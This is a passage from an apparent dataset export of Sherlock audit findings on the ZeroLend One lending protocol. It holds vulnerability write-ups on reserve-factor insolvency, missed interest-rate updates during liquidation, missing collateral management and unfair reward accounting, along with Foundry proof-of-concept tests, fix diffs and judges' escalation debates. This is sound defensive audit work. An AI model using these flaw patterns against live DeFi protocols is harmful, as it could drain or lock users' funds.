uint40(block.timestamp)) return;\n\n    _updateIndexes(self, _cache);\n-   _accrueToTreasury(_reserveFactor, self, _cache);\n+   _accrueToTreasury(self.lastReserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n+   self.lastReserveFactor = _reserveFactor;\n}\n```\n\nThis solution ensures that the same reserveFactor is used for both interest accrual and treasury minting within each update cycle, preventing inconsistencies while allowing for global reserveFactor changes to take effect gradually across all pools.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  invalid: the cached reserveFactor is also the same used to accrue to treasury.\n\n\n\n**nevillehuang**\n\nrequest poc\n\nSeems related to #199\n\n**sherlock-admin3**\n\nPoC requested from @A2-security\n\nRequests remaining: **19**\n\n**aliX40**\n\nhey @nevillehuang  ,this is not a dup of #199 , we have #316 which is duplicate of #199 . this one is different \n- the comment : \n> invalid: the cached reserveFactor is also the same used to accrue to treasury.\nis incorrect \n\n- here a poc shows how change the factor will lead to insolvency and cause the last withdrawal not able to \nfirst we need to correct the balance calculation in [PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol): \n```diff\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-     uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-     return self.supplyShares + increase;\n+    return self.supplyShares.rayMul(index);\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n-     uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n-     return self.debtShares + increase;\n+    return self.debtShares.rayMul(index);\n  }\n```\n- add this test to [PoolRepayTests](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/test/forge/core/pool/PoolRepayTests.t.sol#L9)\n```js\n  function test_auditPoc_reserve() external {\n    console.log('balance pool before : ', tokenA.balanceOf(address(pool)));\n    _mintAndApprove(alice, tokenA, 2 * amount, address(pool));\n    vm.startPrank(alice);\n\n    pool.supplySimple(address(tokenA), alice, amount, 0); // deposit : 2000e18\n    pool.borrowSimple(address(tokenA), alice, borrowAmount, 0); // borrow : 800e18\n\n    vm.stopPrank();\n    // wrap sometime so the intrest accrue :\n    vm.warp(block.timestamp + 30 days);\n    // change reserve factor to 0.2e4 (20%):\n    poolFactory.setReserveFactor(0.2e4);\n\n    vm.startPrank(alice);\n    tokenA.approve(address(pool), UINT256_MAX);\n    pool.repaySimple(address(tokenA), UINT256_MAX, 0);\n    // withdraw all will revert cause there is not enough funds for treasury due to updating the factor :\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenA), alice, UINT256_MAX, 0);\n    vm.stopPrank();\n\n  }\n  ```\n  - the transaction will revert , because the amount accrued to treasury , doesn't exist , and please notice that this will effect all the pool in the protocol , and this amount will keep growing , since it's accumulate yield as well , which is insolvency\n\n\nThe issue described in the report, is similar to a bug found in the aave v3 codebase when updating the reserveFactor. This bug have been disclosed and fixed with the v3.1 release\nhttps://github.com/aave-dao/aave-v3-origin/blob/3aad8ca184159732e4b3d8c82cd56a8707a106a2/src/core/contracts/protocol/pool/PoolConfigurator.sol#L300C1-L315C4\n```solidity\n  function setReserveFactor(\n    address asset,\n    uint256 newReserveFactor\n  ) external override onlyRiskOrPoolAdmins {\n    require(newReserveFactor <= PercentageMath.PERCENTAGE_FACTOR, Errors.INVALID_RESERVE_FACTOR);\n\n  @>>   _pool.syncIndexesState(asset);\n\n    DataTypes.ReserveConfigurationMap memory currentConfig = _pool.getConfiguration(asset);\n    uint256 oldReserveFactor = currentConfig.getReserveFactor();\n    currentConfig.setReserveFactor(newReserveFactor);\n    _pool.setConfiguration(asset, currentConfig);\n    emit ReserveFactorChanged(asset, oldReserveFactor, newReserveFactor);\n\n    _pool.syncRatesState(asset);\n  }\n```\n\nAlso the fix we recomended is inspired by how the eulerv2 handled this, in their vault. (cache reserve factor when calling updateInterestrate, and use the cached factor when updating the index!)\n\n**0xspearmint1**\n\nescalate\n\n`setReserveFactor()` is a protocol admin function\n\nSherlock rules state\n>Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.\n\n>An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.\n\n1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist\n\n2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid \n\n\n\n**sherlock-admin3**\n\n> escalate\n> \n> `setReserveFactor()` is a protocol admin function\n> \n> Sherlock rules state\n> >Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.\n> \n> >An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.\n> \n> 1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist\n> \n> 2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid \n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**aliX40**\n\nFirst point: \n- If the admin calls forceUpdateReserve() on the pools before calling setReserveFactor() this issue will not exist\n\nThis is not true and presents a Dos attack vector. Creating pools on zerolend is permissionless, u can't simply expect the admin to call forceUpdateReserve() on 10 of thousands of pools before changing the resrve factor. This is  simply unrealistic, costly and opens an attack vector for people to dos the treasury\nSecond point:\n- this issue doesn't expect and admin to make a mistake. Any call or changes to the reserve factor will provide damages to the deployed pools in the system. (Meaning if reserveFactor is increased or decreased there will be  a significant Impact on the system  (Please read our report for full details))\n\n**0xDenzi**\n\nI would also like to clarify further for the escalator that the 2nd point does not apply to functions which itself are broken/incomplete. The issue is not about admin missing or not executing or delaying a call or providing a wrong input. The issue is that the function is missing line/s of code to properly adjust the reserve factor.\n\n**cvetanovv**\n\nThis issue falls right between the \"Admin Input/call validation\" rules and broken functionality:\n\n> Admin could have an incorrect call order. An admin action can break certain assumptions about the functioning of the code.\n\n>Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nBut I think we have broken functionality here, not an admin error.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402/#issuecomment-2395262880): rejected",
      "summary": "\nIssue M-9: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk\n\nSummary:\n\nThe ZeroLend protocol's `PoolFactory` allows for global changes to the `reserveFactor`, which affects all pools simultaneously. However, the `ReserveLogic` contract applies this change inconsistently between interest accrual and treasury minting processes. This results in a mismatch between accrued interest for users and the amount minted to the treasury, potentially leading to protocol insolvency or locked funds.\n\nVulnerability Detail:\n\nThe `reserveFactor` is a crucial parameter in the protocol that determines the portion of interest accrued from borrowers that goes to the protocol's treasury. It is defined in the `PoolFactory` contract and used across all pools created by the factory. However, the `reserveFactor` can be changed globally for all pools, leading to a discrepancy between the interest accrued for users and the amount minted to the treasury. This can result in overallocation or underallocation of funds to the treasury, compromising the protocol's financial integrity.\n\nImpact:\n\nThe inconsistency in applying reserve factor changes can lead to protocol insolvency risk or locked funds. Increased `reserveFactor` causes over-minting to the treasury, leaving insufficient funds for user withdrawals. Decreased `reserveFactor` results in under-minting, locking tokens in the contract permanently. Both scenarios compromise the protocol's financial integrity.\n\nRecommendation:\n\nIt is recommended to store the `lastReserveFactor` used for each pool to ensure consistency between interest accrual and treasury minting. This approach is similar to other protocols and can prevent potential discrepancies. Additionally, it is suggested to update all pools before changing the `reserveFactor` to avoid potential issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402",
      "tags": [],
      "finders": [
        "zarkk01",
        "denzi\\_",
        "A2-security"
      ]
    },
    {
      "id": "41829",
      "title": "M-8: Liquidation fails to update the interest Rate when liquidation funds are sent to the treasury thus the next user uses an inflated index",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401 \n\n## Found by \nA2-security, Bigsam, almurhasan, dany.armstrong90, ether\\_sky, nfmelendez, trachev\n### Summary\n\nA bug exists in the Zerolend liquidation process where the interest rate is not updated before transferring liquidation funds to the treasury. This omission leads to an inflated index being used by the next user when performing subsequent actions such as deposits, withdrawals, or borrowing, similar to the previously reported bug in the withdrawal function. As a result, the next user may receive fewer shares or incur an incorrect debt due to the artificially high liquidity rate.\n\n---\n\n\n### Root Cause\n\n\nExamples of update rate before transferring everywhere in the protocol to maintain Rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158\n\nThe same process can be observed in Aave v 3.\n\n1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130\n2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65\n3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150\n4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232\n\nLooking at the effect of updating rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131\n\nThis rates are used to get the new index\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237\n\n-\n\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nDuring the liquidation process in Zerolend, when funds are transferred to the **treasury** as a liquidation protocol fee, the interest rate in the pool is **not updated** before the transfer. This failure results in the next user's interaction with the protocol (such as a deposit, withdrawal, or loan) being calculated based on an **inflated liquidity rate**. The inflated rate causes the user to receive fewer shares than they should or be charged an incorrect interest rate.\n\nIn contrast, **Aave’s approach** ensures that the interest rate is always updated when necessary and adjusted when funds are moved outside the system. Aave achieves this by transferring the funds inside the contract in the form of **aTokens**, which track liquidity changes, and since atokens are not burnt there is no need to update the interest rate accordingly in this case. \n\nZerolend, however, directly transfers funds out of the pool without recalculating the interest rate, which leads to inconsistencies in the index used by the next user.\n\n#### Code Context:\n\nIn Zerolend's liquidation process, when a user is liquidated and the liquidation fee is sent to the treasury, the protocol transfers the funds directly without updating the interest rate.\n\n```solidity\n// Transfer fee to treasury if it is non-zero\nif (vars.liquidationProtocolFeeAmount != 0) {\n    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();\n    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);\n    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {\n        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);\n    }\n@audit >> transferring underlying asset out without updating interest rate first>>>>\n\n    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);\n}\n```\n\nAs can be seen in the code, the liquidation protocol fee is transferred to the treasury, but no interest rate update takes place **before** the transfer. This results in an incorrect liquidity rate for the next user interaction.\n\n#### Comparison with Aave:\n\nAave uses **aTokens** for transfers within the protocol, and the interest rate is updated accordingly when funds are moved, ensuring that the liquidity rate and index are always accurate. In Aave’s liquidation process, the aTokens are transferred to the treasury rather than removing liquidity directly from the pool.\n\n```solidity\nvars.collateralAToken.transferOnLiquidation(\n    params.user,\n    vars.collateralAToken.RESERVE_TREASURY_ADDRESS(),\n    vars.liquidationProtocolFeeAmount\n);\n```\n\nIn Aave’s implementation, the **aToken** system ensures that the liquidity and interest rates are intact based on the movement of funds and not transferring underlying assets.\n\n---\n\n### Impact\n\n- **Incorrect Share Calculation**: Deposits, withdrawals, and loans after a liquidation may use an inflated liquidity rate, resulting in **fewer shares** minted for depositors or incorrect debt calculations for borrowers.\n- **Protocol Inconsistency**: The protocol operates with an inaccurate interest rate after each liquidation, leading to potential financial discrepancies across user interactions.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nTo address this issue, the **interest rate must be updated** before transferring any liquidation protocol fees to the treasury. This ensures that the system correctly accounts for the reduction in liquidity due to the transfer. This will be my last report here before transferring funds to the treasury also a bug was discovered before transferring. kind fix also. thank you for the great opportunity to audit your code i wish zerolend the very best in the future.\n\n#### Suggested Fix:\n\nIn the liquidation logic, invoke the **`updateInterestRates`** function on the **collateral reserve** before transferring the funds to the treasury. This will ensure that the correct liquidity rate is applied to the pool before the funds are removed.\n\n##### Modified Code Example:\n\n```solidity\n\nif (vars.liquidationProtocolFeeAmount != 0) {\n    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();\n    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);\n    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {\n        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);\n    }\n\n++   // Before transferring liquidation protocol fee to treasury, update the interest rates\n++   collateralReserve.updateInterestRates(\n++  totalSupplies,\n++  collateralReserveCache,\n++  params.collateralAsset,\n++  IPool(params.pool).getReserveFactor(),\n++  0, // No liquidity added\n++   vars.liquidationProtocolFeeAmount, // Liquidity taken during liquidation\n++  params.position,\n++ params.data.interestRateData\n++ );\n\n++ // Now, transfer fee to treasury if it is non-zero\n\n    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);\n}\n```\n\nIn this updated version, the interest rates are recalculated **before** the liquidation protocol fee is transferred to the treasury. This ensures that subsequent deposits, withdrawals, and loans use the correct liquidity rate and avoid discrepancies caused by an inflated index.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\nSeems related to #387 in terms of root cause\n\n**sherlock-admin4**\n\nPoC requested from @Tomiwasa0\n\nRequests remaining: **14**\n\n**Tomiwasa0**\n\n1. After setting liquidationProtocolFeePercentage to 20%, 20-10% using aave's examples\n\n2.  add to addresses\n\n```solidity\n  ++   address sam = address(3);\n  ++   address dav = address(4);\n```\n\n4. PASTE AND RUN THE POC\n\n```solidity\n  function _generateLiquidationCondition() internal {\n   _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n   _mintAndApprove(sam, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB\n     _mintAndApprove(dav, tokenA, mintAmountA, address(pool)); // bob 2000 tokenB\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    \n    vm.startPrank(sam);\n    pool.supplySimple(address(tokenA), sam, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n\n     vm.startPrank(sam);\n    pool.borrowSimple(address(tokenB), sam, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n    \n    vm.startPrank(bob);\n    pool.borrowSimple(address(tokenA), bob , 500e18, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n     // Get the current block timestamp\n        uint256 currentTime = block.timestamp;\n\n    // Set the block.timestamp to current time plus 100 seconds\n        vm.warp(currentTime + 1000);\n\n\n    assertEq(tokenB.balanceOf(alice), borrowAmountB);\n\n    oracleA.updateAnswer(0.45e8);\n  }\n\n``` \n\n**Updated Liquidation  Function:**\n\n```solidity\nfunction testLiquidationSimple2() external {\n    _generateLiquidationCondition();\n    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);\n\n    vm.startPrank(bob);\n    // vm.expectEmit(true, true, true, false);\n    // emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether);\n\n    vm.stopPrank();\n\n    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);\n\n    assertTrue(totalDebtBase > totalDebtBaseNew);\n    \n    // Get the current block timestamp\n    uint256 currentTime3 = block.timestamp;\n\n    // Set the block.timestamp to current time plus 100 seconds\n    vm.warp(currentTime3 + 500);\n\n    vm.startPrank(dav);\n    pool.supplySimple(address(tokenA), dav, 100e18, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n   \n    assertEq(pool.getBalanceRaw(address(tokenA), dav, 0).supplyShares, 99999784100498438999);\n}\n```\n\n\nBefore Updating the index with Amount minted to tresury\ndav got - 99999784100498438999;\nAfter update - 99999783033155331339,\n\n\n```solidity\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 67.39ms (15.32ms CPU time)\n\nRan 1 test suite in 2.36s (67.39ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 99999783033155331339 != 99999784100498438999] testLiquidationSimple1() (gas: 1610672)\n```\n\n5. Other points are stated in issue 387\n\n\n**0xSpearmint**\n\nThis issue is low severity. It does not satisfy the criteria for medium.\n\nAs shown by the POC, the difference in shares is 0.00000106% which is not large enough (0.01%) to be medium severity.\n\n\n\n**cvetanovv**\n\nI agree with @0xSpearmint. This issue does not meet the criteria for Medium severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nI'm planning to invalidate the issue.\n\n**Tomiwasa0**\n\n@cvetanovv  , \n\n---\nTo get the full impact of this kindly apply the appropriate fix to the bugs discovered in the liquidation function issue 473 and others, this creates a scenario also almost similar to issue 199 attacker get free  funds, \n\n\nIn evaluating the current system's functionality, issue 91 identified seven significant impacts resulting from improper handling, specifically regarding the liquidity and collateral management mechanisms:\n\n1. **Incorrect Withdrawals**: The amount withdrawn is consistently 1% of the liquidated amount, which deviates from expected behavior.\n  \n2. **Test Validity**: The test scenario I provided demonstrates the validity of the concern, although I was unable to use an appropriate timeframe due to the Chainlink timestamp check. To ensure accuracy, I strongly recommend both parties rerun the scenario with the following conditions:\n   - Funds are borrowed and remain unpaid after 3 to 6 months.\n   - The collateral value drops, and the user is subsequently liquidated.\n\n3. **Systematic Impact**: As stated in issue 91, testing across all relevant functions reveals that this has a distinct impact on subsequent function calls, altering the expected outputs.\n\n4. **Minting of Free Shares**: By not considering other influencing factors, the current setup inadvertently allows users to mint free shares. These shares can then be converted back to the original amount, creating an imbalance. \n\n5. **Collateral Decline Over Time**: The decline in collateral value over time affects the Liquidity in the pool, further complicating the issue. The test case clearly illustrates how the system's behavior changes in these scenarios. creates DOS vulnerability like issue 488 and 375.\n\n6. **Use of New Inputs**: By running the system using the new inputs provided, you will see the exact impact referenced by spearmint. This highlights the need for a comprehensive review of the mechanics involved.\n\n---\n\n\n\n**cvetanovv**\n\n@Tomiwasa0 I will agree with your comment and leave this issue as is.",
      "summary": "\nThe Zerolend liquidation process has a bug where the interest rate is not updated before transferring liquidation funds to the treasury. This leads to an inflated index being used by the next user, resulting in incorrect share calculations and potential financial discrepancies. The root cause of the bug is the failure to update the interest rate before transferring funds, which is necessary to maintain the correct liquidity rate. A similar issue has been found in the withdrawal function as well. A suggested fix is to update the interest rate before transferring the funds, similar to how Aave handles it. This issue has a low severity as the difference in shares is only 0.00000106%, which does not meet the criteria for a medium severity issue. However, it is recommended to apply the appropriate fix to other bugs discovered in the liquidation function to prevent further issues and potential vulnerabilities. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401",
      "tags": [],
      "finders": [
        "dany.armstrong90",
        "trachev",
        "almurhasan",
        "ether\\_sky",
        "A2-security",
        "nfmelendez",
        "Bigsam"
      ]
    },
    {
      "id": "41828",
      "title": "M-7: Position Risk Management Functionality Missing in Position Manager and dos in certain conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398 \n\n## Found by \n0xc0ffEE, A2-security, almurhasan, tallo\n## Summary\nProtocol users who manage their positions through the  `PositionManager` are not able to manage risk of their positions, by setting collateral to on and off. Which is a core functionality of every lending protocol. The missing functionality will doss users from withdrawing also in certain conditions.\n## Vulnerability Detail\nFor each collateral resrve the pool tracks whethere the user is using as collateral or not, this is set in the userConfigMap. Any user could set which reserve he is setting as collateral by calling the \n\n```solidity\nfunction setUserUseReserveAsCollateral(address asset, uint256 index, bool useAsCollateral) external {\n    _setUserUseReserveAsCollateral(asset, index, useAsCollateral);\n  }\n```\nThe PositionManager.sol which the protocol users, are expected to interact with, doesn't implement the setUserUseReserveAsCollateral(), which first of all leads to the inablity of protocol users to manage risk on their Positions. \nThe second impact and the most severe is that Position holders will be dossed, in the protocols if the ltv of one of the reserve token being used, will be set to zero. In such an event, users are required to set the affected collateral to false in order to do operations that lowers the ltv like withdraw to function.\n\nThe doss will be done in the function `validateHFandLtv()` which will be called to check the health of a position is maintend after a withdrawal\n\n```solidity\n  function validateHFAndLtv(\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    DataTypes.UserConfigurationMap memory userConfig,\n    DataTypes.ExecuteWithdrawParams memory params\n  ) internal view {\n    DataTypes.ReserveData memory reserve = reservesData[params.asset];\n\n    (, bool hasZeroLtvCollateral) = validateHealthFactor(_balances, reservesData, reservesList, userConfig, params.position, params.pool);\n\n@>>    require(!hasZeroLtvCollateral || reserve.configuration.getLtv() == 0, PoolErrorsLib.LTV_VALIDATION_FAILED);\n  }\n```\nIn this case, if the user wants to withdraw other reserves that don't have 0 tlv, the transaction will revert.\n\n\n## Impact\n- missing core functions, that NFTPositionManager users are not able to use\n- NFTPositionManager are unable to manage to risk at all\n- Withdrawal operations in NFTPositionManager will be dossed in certain conditions\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/Pool.sol#L175C1-L177C4\n## Tool used\n\nManual Review\n\n## Recommendation\nImplement the missing functionality in the `NFTPositionManager.sol`, to allow users to manage the risk on their `NFTPosition`\n\n\n\n## Discussion\n\n**0xjuaan**\n\n@nevillehuang The main impact here is that if an admin sets the ltv of a collateral to zero, then users withdrawals from the NFTPositionManager will be DoS'd. If this is valid, shouldn't #166 be valid? Since 166 was invalidated since it required admins to perform actions that lead to issues.",
      "summary": "The bug report discusses an issue with the Position Risk Management functionality in the Position Manager. This functionality is missing, which means that users are unable to manage the risk of their positions by setting collateral on and off. This is a core feature of any lending protocol. The missing functionality can also cause users to be unable to withdraw in certain conditions. The bug report provides details on how this issue can be exploited and the impact it has on users. It also includes a code snippet and a recommendation to implement the missing functionality in the NFTPositionManager. The bug was found through manual review and is currently being discussed by developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398",
      "tags": [],
      "finders": [
        "tallo",
        "0xc0ffEE",
        "A2-security",
        "almurhasan"
      ]
    },
    {
      "id": "41827",
      "title": "M-6: The rewards distribution in the NFTPositionManager is unfair",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393 \n\n## Found by \n000000, 0xNirix, A2-security, ether\\_sky, iamnmt\n## Summary\nIn `NFTPositionManager`, users can `deposit` or `borrow` `assets` and earn `rewards` in `zero`.\nHowever, the distribution of these `rewards` is not working correctly.\n## Vulnerability Detail\nLet's consider a `pool`, `P`, and an `asset`, `A`, with a current `liquidity index` of `1.5`.\n- Two users, `U1` and `U2`, each `deposit` `100` units of `A` into `pool` `P`. (Think of `U1` and `U2` as `token IDs`.)\n- Let's define `assetHash(P, A, false)` as `H`.\n- In the `_supply` function, the `balance` is `100`, since it represents the `asset amount`, not `shares` (as seen in `line 57`).\n```solidity\nfunction _supply(AssetOperationParams memory params) internal nonReentrant {\n  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n57:  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n  _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n}\n```\n- The `shares` for these users would be calculated as `100 ÷ 1.5 = 66.67 shares` each in the `P`.\n\nNow, in the `_handleSupplies` function, we compute the `total supply` and `balances` for these users for the `assetHash` `H`.\n```solidity\nfunction _handleSupplies(address pool, address asset, uint256 tokenId, uint256 balance) internal {\n  bytes32 _assetHash = assetHash(pool, asset, false);  // H\n  uint256 _currentBalance = _balances[tokenId][_assetHash];  // 0\n  \n  _updateReward(tokenId, _assetHash);\n  _balances[tokenId][_assetHash] = balance; // 100\n  _totalSupply[_assetHash] = _totalSupply[_assetHash] - _currentBalance + balance;\n}\n```\nThose values would be as below:\n- Total supply: `totalSupply[H] = 200`\n- Balances: `_balances[U1][H] = _balances[U2][H] = 100`\n#### After some time:\n\n- The `liquidity index` increases to `2`.\n- A new user, `U3`, `deposits` `110` units of `A` into the `pool` `P`.\n- `U2` makes a small `withdrawal` of just `1 wei` to trigger an update to their `balance`.\n\nNow, the `total supply` and user `balances` for `assetHash` `H` become:\n\n- `_balances[U1][H] = 100`\n- `_balances[U2][H] = 100 ÷ 1.5 × 2 = 133.3`\n- `_balances[U3][H] = 110`\n- `totalSupply[H] = 343.3`\n\nAt this point, User `U1`’s `asset balance` in the `pool P` is the largest, being `1 wei` more than `U2`'s and `23.3` more than `U3`'s. \nYet, `U1` receives the smallest `rewards` because their `balance` was never updated in the `NFTPositionManager`. \nIn contrast, User `U2` receives more `rewards` due to the `balance` update caused by `withdrawing` just `1 wei`.\n\n### The issue:\n\nThis system is unfair because:\n\n- User `U3`, who has fewer `assets` in the `pool` than `U1`, is receiving more `rewards`.\n- The `rewards` distribution favors users who perform frequent updates (like `deposits` o `withdrawals`), which is not equitable.\n\n### The solution:\n\nInstead of using the `asset balance` as the `rewards` basis, we should use the `shares` in the `pool`. \nHere’s how the updated values would look:\n\n- `_balances[U1][H] = 66.67`\n- `_balances[U2][H] = 66.67 - 1 wei`\n- `_balances[U3][H] = 110 ÷ 2 = 55`\n- `totalSupply[H] = 188.33`\n\nThis way, the `rewards` distribution becomes fair, as it is based on actual contributions to the `pool`.\n## Impact\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L57-L58\n## Tool used\n\nManual Review\n\n## Recommendation\n```solidity\nfunction _supply(AssetOperationParams memory params) internal nonReentrant {\n  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n-  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n+  uint256 balance = pool.getBalanceRaw(params.asset, address(this), params.tokenId).supplyShares;\n\n  _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n}\n```\nThe same applies to the `_borrow`, `_withdraw`, and `_repay` functions.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\nIs there a permisionless update functionality?\n\n**sherlock-admin4**\n\nPoC requested from @etherSky111\n\nRequests remaining: **25**\n\n**etherSky111**\n\nThanks for judging.\n\nThere is a clear issue. \nhttps://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473\nTo test this issue properly, we need to resolve the above issue 